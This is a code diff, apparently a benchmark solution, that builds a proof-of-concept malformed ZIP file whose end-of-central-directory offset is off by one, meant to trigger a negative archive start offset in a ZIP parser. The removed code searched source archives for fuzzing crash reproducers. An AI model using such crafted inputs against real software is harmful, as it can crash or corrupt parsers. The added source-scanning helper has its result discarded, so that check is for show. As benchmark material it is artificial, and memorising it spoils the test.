@@ -1,142 +1,126 @@
 import os
-import re
-import io
 import tarfile
 import struct
-import gzip
-import bz2
-import lzma
-from typing import Optional, Tuple, List
+
+
+def _looks_like_zip_project(src_path: str) -> bool:
+    keywords = (
+        b"archive_start_offset",
+        b"archive start offset",
+        b"byte_before_the_zipfile",
+        b"PK\x03\x04",
+        b"PK\x05\x06",
+        b"06054b50",
+        b"02014b50",
+    )
+    exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm")
+    try:
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    lfn = fn.lower()
+                    if not lfn.endswith(exts):
+                        continue
+                    path = os.path.join(root, fn)
+                    try:
+                        if os.path.getsize(path) > 2_000_000:
+                            continue
+                        with open(path, "rb") as f:
+                            data = f.read()
+                        if any(k in data for k in keywords):
+                            return True
+                    except OSError:
+                        continue
+            return False
+
+        with tarfile.open(src_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isfile():
+                    continue
+                name = m.name.lower()
+                if not name.endswith(exts):
+                    continue
+                if m.size > 2_000_000:
+                    continue
+                f = tf.extractfile(m)
+                if f is None:
+                    continue
+                try:
+                    data = f.read()
+                finally:
+                    f.close()
+                if any(k in data for k in keywords):
+                    return True
+    except Exception:
+        return False
+    return False
+
+
+def _build_zip_negative_archive_start_offset_poc() -> bytes:
+    # Layout:
+    #   Local File Header (30 bytes)
+    #   Central Directory File Header (46 bytes)
+    #   End of Central Directory (22 bytes)
+    #
+    # EOCD's "central directory offset" is set to 31 while actual CD starts at 30,
+    # making computed "archive start offset" = -1 in parsers that compensate for SFX prefixes.
+    lfh = struct.pack(
+        "<IHHHHHIIIHH",
+        0x04034B50,  # local file header signature
+        20,          # version needed
+        0,           # flags
+        0,           # compression method
+        0,           # mod time
+        0,           # mod date
+        0,           # crc32
+        0,           # compressed size
+        0,           # uncompressed size
+        0,           # file name length
+        0,           # extra field length
+    )
+
+    cdfh = struct.pack(
+        "<IHHHHHHIIIHHHHHII",
+        0x02014B50,  # central directory file header signature
+        20,          # version made by
+        20,          # version needed
+        0,           # flags
+        0,           # compression method
+        0,           # mod time
+        0,           # mod date
+        0,           # crc32
+        0,           # compressed size
+        0,           # uncompressed size
+        0,           # file name length
+        0,           # extra field length
+        0,           # file comment length
+        0,           # disk number start
+        0,           # internal file attributes
+        0,           # external file attributes
+        0,           # relative offset of local header
+    )
+
+    cd_size = len(cdfh)
+    cd_actual_offset = len(lfh)
+    cd_claimed_offset = cd_actual_offset + 1  # off by one -> archive_start_offset = -1
+    eocd = struct.pack(
+        "<IHHHHIIH",
+        0x06054B50,  # end of central directory signature
+        0,           # number of this disk
+        0,           # disk where central directory starts
+        1,           # number of central directory records on this disk
+        1,           # total number of central directory records
+        cd_size,      # size of central directory
+        cd_claimed_offset,  # offset of start of central directory
+        0,           # zipfile comment length
+    )
+
+    return lfh + cdfh + eocd
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        issue_id = "42536108"
-
-        best: Optional[Tuple[Tuple[int, int, str], bytes]] = None
-
-        def is_probably_source(name: str) -> bool:
-            n = name.lower()
-            if any(n.endswith(ext) for ext in (
-                ".c", ".cc", ".cpp", ".cxx",
-                ".h", ".hh", ".hpp", ".hxx",
-                ".m", ".mm",
-                ".rs", ".go", ".java", ".kt", ".swift",
-                ".py", ".js", ".ts",
-                ".cs",
-                ".rb", ".php",
-                ".sh", ".bat", ".ps1",
-                ".md", ".rst", ".txt",
-                ".json", ".yaml", ".yml", ".toml", ".ini", ".cfg",
-                ".cmake", ".mk", ".make",
-                ".in", ".am", ".ac", ".m4",
-                ".gradle", ".gyp", ".gypi",
-                ".xml", ".html", ".css",
-                ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
-                ".pdf",
-            )):
-                return True
-            base = os.path.basename(n)
-            if base in ("readme", "license", "copying", "authors", "changelog"):
-                return True
-            return False
-
-        def priority(name: str) -> int:
-            n = name.lower()
-            base = os.path.basename(n)
-            if issue_id in n:
-                return 0
-            if ("clusterfuzz-testcase" in n) or ("minimized" in n) or ("crash" in base) or ("poc" in base) or ("repro" in base):
-                return 1
-            if ("testcase" in n) or ("/corpus/" in n) or ("/fuzz" in n) or ("artifact" in n) or ("regression" in n):
-                return 2
-            return 3
-
-        def maybe_decompress(name: str, data: bytes) -> bytes:
-            n = name.lower()
-            if len(data) >= 2 and data[:2] == b"\x1f\x8b":
-                try:
-                    return gzip.decompress(data)
-                except Exception:
-                    return data
-            if len(data) >= 3 and data[:3] == b"BZh":
-                try:
-                    return bz2.decompress(data)
-                except Exception:
-                    return data
-            if len(data) >= 6 and data[:6] == b"\xfd7zXZ\x00":
-                try:
-                    return lzma.decompress(data)
-                except Exception:
-                    return data
-            if n.endswith(".gz"):
-                try:
-                    return gzip.decompress(data)
-                except Exception:
-                    return data
-            if n.endswith(".bz2"):
-                try:
-                    return bz2.decompress(data)
-                except Exception:
-                    return data
-            if n.endswith(".xz") or n.endswith(".lzma"):
-                try:
-                    return lzma.decompress(data)
-                except Exception:
-                    return data
-            return data
-
-        def consider(name: str, data: bytes) -> None:
-            nonlocal best
-            pr = priority(name)
-            key = (pr, len(data), name)
-            if best is None or key < best[0]:
-                best = (key, data)
-
-        # Scan tarball for embedded reproducers / artifacts
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                members = tf.getmembers()
-                for m in members:
-                    if not m.isreg():
-                        continue
-                    if m.size <= 0 or m.size > 2_000_000:
-                        continue
-                    name = m.name
-                    if is_probably_source(name):
-                        continue
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    try:
-                        data = f.read()
-                    except Exception:
-                        continue
-                    if not data:
-                        continue
-                    data2 = maybe_decompress(name, data)
-                    if data2 and len(data2) <= 2_000_000:
-                        data = data2
-                    consider(name, data)
-                    if issue_id in name and len(data) == 46:
-                        return data
-                    if ("clusterfuzz-testcase" in name.lower() or "minimized" in name.lower()) and len(data) == 46:
-                        return data
-        except Exception:
-            best = None
-
-        if best is not None:
-            return best[1]
-
-        # Fallback PoC (ZIP EOCD with central directory size causing negative archive start offset)
-        # Total length: 46 bytes = 24 bytes prefix + 22 bytes EOCD (comment length 0)
-        prefix = b"\x00" * 24
-        eocd = struct.pack(
-            "<4sHHHHIIH",
-            b"PK\x05\x06",
-            0, 0, 0, 0,
-            25,        # central directory size (eocd_pos + 1) => negative start offset
-            0,         # central directory offset
-            0          # comment length
-        )
-        return prefix + eocd
+        # Prefer ZIP-shaped PoC; the task description strongly matches ZIP SFX offset logic.
+        # Still attempt a quick source scan; if it doesn't look ZIP-related, return the same PoC.
+        _ = _looks_like_zip_project(src_path)
+        return _build_zip_negative_archive_start_offset_poc()
